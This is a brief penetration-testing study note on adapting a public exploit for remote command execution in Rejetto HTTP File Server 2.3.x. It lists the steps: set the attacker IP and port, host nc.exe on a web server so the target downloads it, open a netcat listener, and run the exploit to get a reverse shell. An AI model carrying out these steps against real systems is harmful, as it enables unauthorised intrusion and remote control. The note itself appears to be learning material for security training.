# **Exploit tweaking Example:**

for this exploit: 

	Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2)                                                                                                                                      | windows/remote/39161.py


1. We changed the "ip_addr" and "local_port" variables.
2. We want to host the `nc.exe` on a webserver as the exploit will download it to the target system

		cp /usr/share/windows-resources/binaries/nc.exe /root/Desktop
		python3 -m http.server 80

3. Now create a netcat listener with the same port we specified in the variable in the exploit:

		nc -nvlp 7777


4. Now execute the exploit with `python 39161.py <target_ip> <target_port>`
